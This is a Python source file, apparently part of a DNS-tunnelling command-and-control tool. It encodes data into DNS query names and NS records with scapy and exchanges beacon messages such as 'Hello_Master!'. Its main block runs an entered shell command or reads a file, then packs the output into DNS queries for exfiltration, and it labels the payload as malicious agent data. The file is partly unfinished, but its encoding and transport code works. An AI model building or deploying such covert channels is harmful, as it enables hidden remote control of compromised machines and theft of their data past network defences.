#!/bin/env python3
from scapy.all import DNS, DNSQR, DNSRR, IP, send, UDP, sniff, Packet
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import UDP, IP
import base64, struct, logging, random, os, time    
import netifaces as ni

CONNECTION_FAILED = -1
TRANSMISSION_FAILED = 1
TRANSSMISION_SUCCESS = 0

REQUEST = 0
RESPONSE = 1

BEACON = 0
ACTIVATE = 1
READY = 2

ATTACK_FILTTER = "udp"

DATA_SIZE = 0
DATA = 1
DATA_ID = 2
DATA_END = 3

DEFAULT = 6
DEFAULT_MAX_PAYLOAD_SIZE = 96

DOMAIN = 'c2.dns'
KEEP_ALIVE = 2

handshack = [b"Hello_Master!", b"Hello_Son", b"waiting_for_orders"]

def get_my_ip_address(interface_name):
    return ni.ifaddresses(interface_name)[ni.AF_INET][0]['addr']

def Send(pkt: Packet, hold=False):
    if hold:
        time.sleep(1)
    send(pkt, verbose=False)

def Create_Logger_Object(log_level: logging) -> logging:
    logger = logging.getLogger()
    logger.setLevel(log_level)
    stream_handler = logging.StreamHandler()
    stream_handler.setLevel(log_level)  
    formatter = logging.Formatter('%(message)s')
    stream_handler.setFormatter(formatter)
    logger.addHandler(stream_handler)

    return logger


class DNS_Payload(object):
    '''
    Class DNS_Payload take care of everything related to packing, extracting and
    ordering the data in way that suits DNS communications
    '''
    def __init__(self, data, id: int, end=False, debug=False) -> None:
        self.data = data
        self.id = id
        self.end = end
        self.debug = debug
        if debug:
            print(self.data, self.id, self.end)
    
    def Pack(self):
        '''
        Pack the data into bytes and encoding it to base64 (url_safe)
        '''
        data_size = len(self.data)
        if self.debug:
            print(f"Pack func:", self.data, type(self.data))
        packed_payload = struct.pack(f"i{data_size}si?", data_size, self.data, self.id, self.end)
        return base64.urlsafe_b64encode(packed_payload)

    @staticmethod
    def Pack_data(data: bytes, size: int, domain: str) -> list:
        '''
        The function convert the 'data' into a list of qnames packed and encoded to be sent.
        '''
        data_enc = base64.b64encode(data)
        fragments = DNS_Payload.Slice_to_fragment(data_enc, size)
        data_list = []
        for index, frag in enumerate(fragments):
            end = False
            if index == len(fragments) - 1:
                end = True
            frag = frag.encode()
            payload = DNS_Payload(frag, index, end)
            payload = payload.Pack()
            data_list.append(DNS_Payload.Craft_qname(payload, domain))
        return data_list
    
    @staticmethod
    def Unpack_data(payload, domain):
        payload = DNS_Payload.Remove_points_domian(payload, domain)
        return DNS_Payload.UnPack(payload)

    @staticmethod
    def Craft_qname(payload: bytes, domain: str, group=60, char='.'):
            decoded_str = payload.decode()
            return (char.join(decoded_str[i:i+group] for i in range(0, len(payload), group)) + '.' + domain + '.').encode()

    @staticmethod
    def UnPack(payload_to_unpack: bytes) -> bytes: 
        '''
        Static method: UnPack
        takes Raw payload from the DNS packet, decode it from base64
        and unpack tha data to a 3 members tupele: (data, id: int, end: bool)
        '''
        try:
            data_size = DNS_Payload.get_data_size(payload_to_unpack)
            decrypted_payload = base64.urlsafe_b64decode(payload_to_unpack)
            return struct.unpack(f"i{data_size[0]}si?", decrypted_payload)
        except:
            return None

    @staticmethod    
    def Remove_points_domian(qname: bytes, domain: str):
        qname = qname.decode().replace("."+domain+".", '')
        qname = qname.replace(".","")
        return qname.encode()
    
    @staticmethod
    def get_data_size(enc_payload: bytes):
        try:
            decrypted_payload = base64.urlsafe_b64decode(enc_payload)
            return struct.unpack_from('i', decrypted_payload, offset=0)
        except:
            return None
    
    @staticmethod
    def Slice_to_fragment(output_cm: bytes, fragment_size: int) -> list:
            output_cm = output_cm.decode()
            return [output_cm[i:i+fragment_size] for i in range(0, len(output_cm), fragment_size)]


class DNS_Packet:
    def __init__(self, ip: str, domain: str, port: int = 53, max_payload_size:int = 95):
        self.ip = ip
        self.port = port
        self.domain = domain
        self.max_payload_size = max_payload_size - (len(domain) + 2)

    def Extract_Data(self, pkt:Packet):
        if pkt[DNS].qr == REQUEST:
            data = DNS_Packet.get_qname(pkt)
        elif pkt[DNS].qr == RESPONSE:
            data = DNS_Packet.get_rdata(pkt)
        return DNS_Payload.Unpack_data(data, self.domain)

    def Craft_Requset_Packet(self, payload: bytes) -> list:
        ip_layer = IP(dst=self.ip)
        udp_layer = UDP(dport=self.port)
        pkt_list = []

        qname_list = DNS_Payload.Pack_data(payload, self.max_payload_size, self.domain)
        for qname in qname_list:
            dns_request = DNS(qr=REQUEST, z=0, qd=DNSQR(qname=qname, qtype="A"), id=DNS_Packet.set_random_id()) 
            pkt_list.append(ip_layer / udp_layer / dns_request)
            
        return pkt_list

    def Craft_Response_Packet(self, payload: bytes, req_pkt: Packet, data_id: int):
        ip_layer = IP(version=4, dst=req_pkt[IP].src)
        print(f"req_pkt src IP --> {req_pkt[IP].src}")
        udp_layer = UDP(sport=req_pkt[UDP].dport, dport=req_pkt[UDP].sport)
        payload = DNS_Payload(payload, data_id)
        payload = payload.Pack()
        rdata = DNS_Payload.Craft_qname(payload, self.domain)
        qname = self.get_qname(req_pkt)
        dnsq = DNSQR(qname=DNS_Packet.get_qname(req_pkt), qtype='A', qclass='IN')
        dnsr_an = DNSRR(rrname=qname, type='A', rclass='IN', ttl=604800, rdlen=4, rdata='192.0.0.1')
        ns1 = DNSRR(rrname=self.domain, type='NS', rclass='IN', ttl=604800, rdata=rdata)
        ns2 = DNSRR(rrname=self.domain, type='NS', rclass='IN', ttl=604800, rdata='ns2.' + self.domain)
        dns_ns = ns1 / ns2
        dns_response = DNS(
            id=DNS_Packet.get_packet_id(req_pkt),
            qr=RESPONSE,
            opcode=0, 
            qd=dnsq, 
            an=dnsr_an, 
            ns=dns_ns,
            #Flags
            aa=0, rd=1, ra=1, ad=1, cd=1
        )

        return ip_layer / udp_layer / dns_response

    @staticmethod
    def get_qname(pkt: Packet):
        if pkt.haslayer(DNSQR):
            return pkt[DNSQR].qname
        else:
            return None
    @staticmethod
    def get_rdata(res_pkt: Packet):
        if res_pkt.haslayer(DNS) and res_pkt[DNS].qr == RESPONSE:
            ns1_record = res_pkt[DNS].ns[0]
            return ns1_record.rdata
        else:
            return None

    @staticmethod
    def get_packet_id(pkt: Packet):
        if pkt.haslayer(DNS):
            return pkt[DNS].id
        else:
            return None
    
    @staticmethod
    def set_random_id():
        return random.randrange(1, 65534)
        
class DNS_Comm:
    def __init__(self, domain: str, iface: str, logger: logging, max_payload_size: int, ack: int, port=53, ip: str = None) -> None:
        self.domain = domain
        self.iface = iface
        self.logger = logger
        self.max_size = max_payload_size
        self.ack = ack
        self.port = port
        self.ip = ip
        self.DNS_Packet = DNS_Packet(self.ip, self.domain)
        

    def IsMine(self, pkt: Packet) -> bool:
        if pkt.haslayer(IP) and pkt.haslayer(DNS):
            data = ''
            if pkt[DNS].qr == REQUEST:
                data = DNS_Packet.get_qname(pkt)
            elif pkt[DNS].qr == RESPONSE:
                data = DNS_Packet.get_rdata(pkt)
            
            self.logger.debug(f"[d] {self.domain.encode()}, {data}")
            if data is not None and self.domain.encode() in data: return True
        
        return False
    
    def Recive(self, timeout=None, filter="udp") -> tuple:
        '''
        Checks whether the packet "IsMine", if is: extract the data
        and return a tuple with the tuple payload and the relevant pkt.
        ((data_size:i, data:byte, data_id:i, end:?), packet)
        '''
        pkt = sniff(filter=filter, count=1, iface=self.iface, timeout=timeout)
        if not pkt: return None
        pkt = pkt[0]
        if pkt.haslayer(IP) and pkt.haslayer(DNS):
            self.logger.debug(f"[d] src IP: {pkt[IP].src}")
            # self.logger.debug(f"[d] id of packet: {pkt[DNS].id}")
            self.logger.debug(f"[d] {pkt.show()}")
            try:
                self.logger.debug(f"[d] qname data: {self.DNS_Packet.get_qname(pkt)}")
                self.logger.debug(f"[d] rdata data: {self.DNS_Packet.get_rdata(pkt)}")
            except:
                self.logger.debug("failed get qname / rdata")
            self.logger.debug("\n\n")
            if self.IsMine(pkt):
                return self.DNS_Packet.Extract_Data(pkt), pkt
            else:
                return None, None

    def reliable_send(self, data_id: int, pkt: Packet) -> bool:
        '''
        Retransmission by the data_id (like tcp-seq) if the data_id recieved is not 
        the one expected retranssmiting
        '''
        retransmission = self.ack
        filter = f"udp port {self.port} and ip src {self.ip}"
        while retransmission > 0:
            Send(pkt, hold=True)
            result = self.Recive(timeout=5, filter=filter)
            if result is not None:
                payload, res_pkt = result
                self.logger.debug(f"payload id is: {payload[DATA_ID]}, retransmission = {10 - retransmission}")
                if data_id == payload[DATA_ID]: 
                    return True
            retransmission -= 1
        return False

    def Add_IP(self, pkt: Packet) -> None:
        self.ip = pkt[IP].src
        self.DNS_Packet = DNS_Packet(self.ip, self.domain)

    def Craft_Response(self, payload: bytes, req_pkt: Packet, data_id: int) -> Packet:
        return self.DNS_Packet.Craft_Response_Packet(payload, req_pkt, data_id)

    def Craft_Request(self, payload: bytes) -> Packet:
        return self.DNS_Packet.Craft_Requset_Packet(payload)

#   TO DO:    
#   - agent send QUERY to DNS SERVER
#   - DNS_Packet.get_rdata -> from new response packet
#   - Test On new inviroment
      
if '__main__' == __name__:
    logger = Create_Logger_Object(logging.DEBUG)
    ip = '192.168.2.2'
    id = 8
    domain = "dns.c2"
    iface = "eth0"
    comm = DNS_Comm(domain, iface, logger, 96, 10, ip=ip)
    
    req_obj = DNS_Packet(ip, "domain")
    req_pkts = req_obj.Craft_Requset_Packet(b"asdasdasfwef")
    for req_pkt in req_pkts:
        res_pkt = req_obj.Craft_Response_Packet(b"asdfasdlkfjas", req_pkt, 3)
        logger.debug(f"[d] Testing IsMain for False domain:\n[d] {comm.IsMine(req_pkt)}, {comm.IsMine(res_pkt)}")

    req_obj = DNS_Packet(ip, domain)
    req_pkt = req_obj.Craft_Requset_Packet(b"here is my melicoius data from agaent")
    for req_pkt in req_pkts:
        res_pkt = req_obj.Craft_Response_Packet(b"here is my melicoius data from server", req_pkt, 3)
        logger.debug(f"[d] Testing IsMain for True domain:\n[d] {comm.IsMine(req_pkt)}, {comm.IsMine(res_pkt)}")

    req_pkt = comm.Craft_Request(b"asdlkjasd")
    for req_pkt in req_pkts:
        res_pkt = comm.Craft_Response(b"askdjlakjsd", req_pkt, 3)
        logger.debug(f"[d] Testing IsMain for True domain:\n[d] {comm.IsMine(req_pkt)}, {comm.IsMine(res_pkt)}")
    
    with open('/dev/tty', 'bw') as terminal:
        terminal.write(b"Your output message here\n")

        cmd = input("[cmd] ")
    try:
        utput_cm = os.popen(cmd + " 2>&1").read()
    except UnicodeDecodeError:
        if 'cat'in cmd:
            file = cmd.split(' ')[1]
        with open(file, 'rb') as fd:
            utput_cm = fd.read()
    
    # pack = dns_utils.DNS_Payload()

    domain = "c2.dns"
    qname_list = DNS_Payload.Pack_data(utput_cm, 96, domain)
    print(qname_list)

    total_payload = ''
    for qname in qname_list:
        data = DNS_Payload.Unpack_data(qname, domain)
        print(data)
        data = data[1].decode()
        print(type(data))
        total_payload = total_payload + data

    total_payload = base64.b64decode(total_payload)
    with open('./new_tests', 'wb') as fd:
        fd.write(total_payload)